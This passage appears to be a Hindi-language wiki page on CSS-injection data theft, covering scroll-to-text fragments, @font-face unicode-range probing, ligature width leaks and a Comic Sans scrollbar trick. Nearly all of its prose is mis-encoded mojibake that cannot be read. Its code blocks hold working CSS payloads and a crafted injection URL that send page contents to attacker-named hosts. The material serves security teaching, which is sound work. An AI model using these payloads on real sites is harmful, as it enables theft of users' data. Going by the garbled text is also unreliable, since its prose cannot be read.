рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдЪрд┐рдВрддрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рд╕реНрдХреНрд░реЙрд▓-рдЯреВ-рдЯреЗрдХреНрд╕реНрдЯ рдлреНрд░реЗрдЧрдореЗрдВрдЯ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рд╢реЛрдз рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдиреНрд╣реЗрдВ HTML рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рдПрдХ CSS рдирд┐рдпрдо рдбрд╛рд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреИрд╕реЗ:
```css
:target::before { content : url(target.png) }
```
рдЗрд╕ рддрд░рд╣ рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ, рдпрджрд┐ рдкреГрд╖реНрда рдкрд░ "рдкреНрд░рд╢рд╛рд╕рдХ" рдЯреЗрдХреНрд╕реНрдЯ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ рд╕реЗ `target.png` рд╕рдВрд╕рд╛рдзрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкрд╛рда рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИред рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдПрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП URL рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯреЗрдб CSS рдХреЛ Scroll-to-text рдлреНрд░реЗрдЧрдореЗрдВрдЯ рдХреЗ рд╕рд╛рде рд╕рдорд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
рдпрд╣рд╛рдБ, рд╣рдорд▓рд╛ HTML рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ CSS рдХреЛрдб рдХреЛ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╡рд┐рд╢реЗрд╖ рдкрд╛рда "рдкреНрд░рд╢рд╛рд╕рдХ" рдХреА рдУрд░ рд▓рдХреНрд╖рд┐рдд рдХрд░рддреЗ рд╣реБрдП Scroll-to-text рдлреНрд░реЗрдЧрдореЗрдВрдЯ (`#:~:text=Administrator`)ред рдпрджрд┐ рдкрд╛рда рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕реВрдЪрд┐рдд рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдкрд░рд╛рдзреА рдХреЛ рдЙрд╕рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИред

рд╕рдВрд╢реЛрдзрди рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмрд┐рдВрджреБрдУрдВ рдХрд╛ рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:

1. **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд STTF рдореИрдЪрд┐рдВрдЧ**: Scroll-to-text Fragment (STTF) рдХреЗрд╡рд▓ рд╢рдмреНрдж рдпрд╛ рд╡рд╛рдХреНрдпреЛрдВ рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреА рдХреНрд╖рдорддрд╛ рдХреЛрдИ рднреА рдЕрдирд┐рдпрдорд┐рдд рд░рд╣рд╕реНрдп рдпрд╛ рдЯреЛрдХрди рд▓реАрдХ рдХрд░рдиреЗ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддреА рд╣реИред
2. **рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рд╕рдВрджрд░реНрднреЛрдВ рдХреА рдкреНрд░рддрд┐рдмрдВрдзрд┐рддрддрд╛**: STTF рдХреЗрд╡рд▓ рд╢реАрд░реНрд╖-рд╕реНрддрд░реАрдп рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЖрдИрдлреНрд░реЗрдореНрд╕ рдХреЗ рднреАрддрд░ рдХрд╛рд░реНрдп рдирд╣реАрдВ рдХрд░рддрд╛, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╢реЛрд╖рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдиреЛрдЯрд┐рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
3. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдХреНрд░рд┐рдпрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛**: STTF рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдХреНрд░рд┐рдпрдХрд░рдг рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЗрд░рд┐рдд рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВред рдпрд╣ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣рдореЗрдВ рдЕрдкрд░рд╛рдзреЛрдВ рдХреЗ рдСрдЯреЛрдореЗрдЯреЗрдб рд╣реЛрдиреЗ рдХреА рдЬреЛрдЦрд┐рдо рдХреЛ рдХрд╛рдлреА рдХрдо рдХрд░рддреА рд╣реИ рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░реЗрдХреНрд╢рди рдХреЗред рдлрд┐рд░ рднреА, рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рд▓реЗрдЦрдХ рдиреЗ рд╡рд┐рд╢реЗрд╖ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдФрд░ рдмрд╛рдпрдкрд╛рд╕ (рдЬреИрд╕реЗ, рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ, рдкреНрд░рд╕рд╛рд░реА рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реЗрдХреНрд╢рди) рдХреЛ рдЙрдзрд╛рд░рдиреЗ рдХреА рд╕рдВрдХреЗрдд рдХрд┐рдП рд╣реИрдВ рдЬреЛ рд╣рдорд▓реЗ рдХреА рдСрдЯреЛрдореЗрд╢рди рдХреЛ рдЖрд╕рд╛рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрди рддрдВрддреНрд░реЛрдВ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рднреЗрджрднрд╛рд╡реЛрдВ рдХреЗ рдЬрд╛рдЧрд░реВрдХрддрд╛ рд╡реЗрдм рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдФрд░ рдЗрд╕ рддрд░рд╣ рдХреЗ рд╢реЛрд╖рдгрд╛рддреНрдордХ рддрдХрдиреАрдХреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рджреЗрдЦреЗрдВ: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

рдЖрдк рдПрдХ [**CTF рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдпрд╣рд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

рдЖрдк **рд╡рд┐рд╢реЗрд╖ рдпреВрдирд┐рдХреЛрдб рдорд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣рд░реА рдлреЙрдиреНрдЯреНрд╕** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХреЗрд╡рд▓ рдкреГрд╖реНрда рдореЗрдВ рдЙрдкрд╕реНрдерд┐рдд рд╣реЛрдиреЗ рдкрд░ **рдЗрдХрдЯреНрдареЗ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
### рдкрд╛рда рдиреЛрдб рдЙрджреНрдзрд╛рд░рдг (I): рд▓рд┐рдЧреЗрдЪрд░реНрд╕ <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**рд╕рдВрджрд░реНрдн:** [Wykradanie danych w ┼Ыwietnym stylu тАУ czyli jak wykorzysta─З CSS-y do atak├│w na webaplikacj─Щ](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рд╡рд░реНрдгрди рдлреЙрдиреНрдЯ рд▓рд┐рдЧреЗрдЪрд░реНрд╕ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рдиреЛрдб рд╕реЗ рдкрд╛рда рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдФрд░ рдЪреМрдбрд╝рд╛рдИ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдиреЗ рдХрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддреА рд╣реИ:

1. **рдХрд╕реНрдЯрдо рдлреЙрдиреНрдЯреНрд╕ рдХрд╛ рдирд┐рд░реНрдорд╛рдг**:
- SVG рдлреЙрдиреНрдЯреНрд╕ рдХреЛ рдЧреНрд▓рд┐рдлреНрд╕ рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рдирдореЗрдВ `horiz-adv-x` рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреЛ рджреЛ рд╡рд░реНрдг рд╕реАрдХреНрд╡реЗрдВрд╕ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЧреНрд▓рд┐рдл рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реА рдЪреМрдбрд╝рд╛рдИ рд╕реЗрдЯ рдХрд░рддреА рд╣реИред
- рдЙрджрд╛рд╣рд░рдг SVG рдЧреНрд▓рд┐рдл: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, рдЬрд╣рд╛рдВ "XY" рдПрдХ рджреЛ рд╡рд░реНрдг рд╕реАрдХреНрд╡реЗрдВрд╕ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИред
- рдЗрди рдлреЙрдиреНрдЯреНрд╕ рдХреЛ рдлреЙрдиреНрдЯрдлреЛрд░реНрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ woff рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд░реВрдкрд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

2. **рдЪреМрдбрд╝рд╛рдИ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛**:
- CSS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрд╛рда рд▓рдкреЗрдЯрдирд╛ рди рд╣реЛ (`white-space: nowrap`) рдФрд░ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рд╕реНрдЯрд╛рдЗрд▓ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
- рдПрдХ рдХреНрд╖реИрддрд┐рдЬ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдХрд╛ рдЙрдкрд╕реНрдерд┐рддрд┐, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдЬреАрд╡, рдПрдХ рд╕рдВрдХреЗрддрдХ (рдУрд░реЗрдХрд▓) рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд▓рд┐рдЧреЗрдЪрд░, рдФрд░ рдЗрд╕рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рд╕реАрдХреНрд╡реЗрдВрд╕, рдкрд╛рда рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
- рд╢рд╛рдорд┐рд▓ CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **рд╢реЛрд╖рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛**:
- **рдЪрд░рдг 1**: рд╡рд┐рд╢рд╛рд▓ рдЪреМрдбрд╝рд╛рдИ рд╡рд╛рд▓реЗ рд╡рд░реНрдгреЛрдВ рдХреЗ рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд▓рд┐рдП рдлреЙрдиреНрдЯ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред
- **рдЪрд░рдг 2**: рдПрдХ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░-рдЖрдзрд╛рд░рд┐рдд рдЪрд╛рд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рд▓рдЧ рд╕рдХреЗ рдХрд┐ рдмрдбрд╝реА рдЪреМрдбрд╝рд╛рдИ рд╡рд╛рд▓рд╛ рдЧреНрд▓рд┐рдл (рд╡рд░реНрдг рдЬреЛрдбрд╝ рдХреЗ рд▓рд┐рдП рд▓рд┐рдЧреЗрдЪрд░) рдХрдм рд░реЗрдВрдбрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд░реНрдг рд╕реАрдХреНрд╡реЗрдВрд╕ рдХреА рдореМрдЬреВрджрдЧреА рдХрд╛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИред
- **рдЪрд░рдг 3**: рдПрдХ рд▓рд┐рдЧреЗрдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдкрд░, рддреАрди-рд╡рд░реНрдг рд╕реАрдХреНрд╡реЗрдВрд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкрд╣рдЪрд╛рдиреА рдЧрдИ рдЬреЛрдбрд╝ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдПрдХ рдкреВрд░реНрд╡рд╡рд░реНрддреА рдпрд╛ рдЙрддреНрддрд░рд╡рд░реНрддреА рд╡рд░реНрдг рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред
- **рдЪрд░рдг 4**: рддреАрди-рд╡рд░реНрдг рд▓рд┐рдЧреЗрдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **рдЪрд░рдг 5**: рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреЛрд╣рд░рд╛рдИ рдЬрд╛рддреА рд╣реИ, рдкреВрд░реЗ рдкрд╛рда рдХреЛ рдкреНрд░рддрд┐рдмрджреНрдз рдХрд░рддреЗ рд╣реБрдПред

4. **рдЕрдиреБрдХреВрд▓рди**:
- рд╡рд░реНрддрдорд╛рди рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рд╡рд┐рдзрд┐ `<meta refresh=...` рдЕрдзрд┐рдХрддрдо рдирд╣реАрдВ рд╣реИред
- рдПрдХ рдФрд░ рдЕрдзрд┐рдХ рджрдХреНрд╖ рдкрд╣реБрдВрдЪ рдЙрдкрд╛рдп CSS `@import` рдЪрд╛рд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╢реЛрд╖рдг рдХреА рдкреНрд░рджрд░реНрд╢рдирдХреНрд╖рдорддрд╛ рдХреЛ рдмрдврд╝рд╛рддреЗ рд╣реБрдПред

### рдкрд╛рда рдиреЛрдб рдЙрджреНрдзрд╛рд░рдг (II): рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯ рдХреЗ рд╕рд╛рде рдЪрд╛рд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ (рдмрд╛рд╣рд░реА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

рдпрд╣ рдЪрд╛рд▓ рдЗрд╕ [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with_single\_css\_injection/) рдореЗрдВ рдЬрд╛рд░реА рдХреА рдЧрдИ рдереАред рдПрдХ рдкрд╛рда рдиреЛрдб рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЪрд╛рд░рд╕реЗрдЯ рдХреЛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: рдХреЛрдИ рдмрд╛рд╣рд░реА -рдпрд╛ рдХрд╕реНрдЯрдо- рдлрд╝реЙрдиреНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред

рдпрд╣ рдзрд╛рд░рдгрд╛ рдПрдХ рдПрдирд┐рдореЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЪрд╛рд░реНрдЯрд░ рдХреЗ рдЪрд░рдгрд╛рддреНрдордХ рд╡рд┐рд╕реНрддрд╛рд░ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╕рдордп рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХ рд╡рд░реНрдг 'рд╕рдлрд╝рд┐рдХреНрд╕' рднрд╛рдЧ рд╕реЗ 'рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕' рднрд╛рдЧ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╣реЛ рд╕рдХреЗред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдкрд╛рда рдХреЛ рджреЛ рдЦрдВрдбреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

1. **рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕**: рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрдВрдХреНрддрд┐ред
2. **рд╕рдлрд╝рд┐рдХреНрд╕**: рдЖрдЧрд╛рдореА рдкрдВрдХреНрддрд┐(рдПрдВ)ред

рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рдВрдХреНрд░рдордг рдЪрд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗ:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


рдЗрд╕ рд╕рдВрдХреНрд░рдордг рдХреЗ рджреМрд░рд╛рди, **рдпреВрдирд┐рдХреЛрдб-рд░реЗрдВрдЬ рдЪрд╛рд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рддреНрдпреЗрдХ рдирдП рд╡рд░реНрдг рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреИрд╕реЗ рд╣реА рд╡рд╣ рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рдХреЙрдорд┐рдХ рд╕реИрдВрд╕ рдлрд╝реЙрдиреНрдЯ рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯ рд╕реЗ рдЕрдзрд┐рдХ рд▓рдВрдмрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд▓рдВрдмрд╡рдд рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдХрд╛ рдЙрдкрд╕реНрдерд┐рддрд┐ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рд╡рд░реНрдг рдХреА рдореМрдЬреВрджрдЧреА рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИред

рдпрджреНрдпрдкрд┐ рдпрд╣ рд╡рд┐рдзрд┐ рдирдП рд╡рд░реНрдгреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреИрд╕реЗ рд╣реА рд╡реЗ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдпрд╣ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд░рддреА рдХрд┐ рдХреМрди рд╕рд╛ рд╡рд░реНрдг рджреЛрд╣рд░рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдпрд╣ рдХрд┐ рдПрдХ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рд╣реБрдИ рд╣реИред

{% hint style="info" %}
рдореВрд▓ рд░реВрдк рд╕реЗ, **рдпреВрдирд┐рдХреЛрдб-рд░реЗрдВрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рд╡рд░реНрдг рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рд▓реЗрдХрд┐рди рд╣рдо рдПрдХ рдмрд╛рд╣рд░реА рдлрд╝реЙрдиреНрдЯ рд▓реЛрдб рдХрд░рдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдвреВрдВрдврдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред\
рдЬрдм **рд╡рд░реНрдг** рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ **рдкреВрд░реНрд╡-рд╕реНрдерд╛рдкрд┐рдд рдХреЙрдорд┐рдХ рд╕реИрдВрд╕ рдлрд╝реЙрдиреНрдЯ** рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд░реНрдг **рдмрдбрд╝рд╛ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ **рдПрдХ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдЬреЛ **рдкрд╛рдП рдЧрдП рд╡рд░реНрдг рдХреЛ рд▓реАрдХ рдХрд░реЗрдЧрд╛**ред
{% endhint %}

рдкреЛрд╕реНрдЯ рдХрд┐рдП рдЧрдП PoC рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЧрдП рдХреЛрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
